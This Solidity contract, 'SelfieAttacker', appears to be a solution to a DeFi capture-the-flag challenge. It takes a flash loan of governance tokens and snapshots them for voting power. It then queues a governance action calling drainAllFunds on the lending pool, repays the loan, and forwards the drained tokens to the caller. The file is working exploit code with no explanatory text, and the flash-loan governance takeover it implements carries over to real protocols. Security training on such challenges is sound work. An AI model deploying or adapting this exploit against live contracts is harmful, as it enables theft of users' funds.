// SPDX-License-Identifier: MIT

import "hardhat/console.sol";

pragma solidity ^0.8.0;
interface IERC20 {
    
    
    function balanceOf(address owner) external view returns (uint);    
    function transfer(address to, uint value) external returns (bool);
    function snapshot() external returns (uint256);

}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;        
}

contract SelfieAttacker {

    address immutable public flashPool;
    address immutable public governance;
    address immutable public gdvt;

    event Enqueued(uint256 indexed actionId);
    
    constructor(
        address pool, 
        address gov, 
        address gdvtAddr
        )
    {
        flashPool = pool;
        governance = gov;
        gdvt = gdvtAddr;
    }

    function startFlashLoan(uint256 amount) public {                                
        IFlashLoanerPool(flashPool).flashLoan(amount);                                
    }

    function receiveTokens(address _gdvt, uint256 amount) external {        
        require(msg.sender == flashPool, "Only Flash pool can call this function");                
        
        // Take snapshot
        uint256 snapshotID = IERC20(gdvt).snapshot();        
        
        // Enque proposal to drain funds
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", address(this));        
        uint256 actionId = ISimpleGovernance(governance).queueAction(flashPool, data, 0);        
        
        // emit action id
        emit Enqueued(actionId);

        // Return the loan
        IERC20(gdvt).transfer(msg.sender, amount);                

    }

    function drainAllGDVT() external {                        
        uint256 amount = IERC20(gdvt).balanceOf(address(this));                    
        IERC20(gdvt).transfer(msg.sender, amount);                
    }
}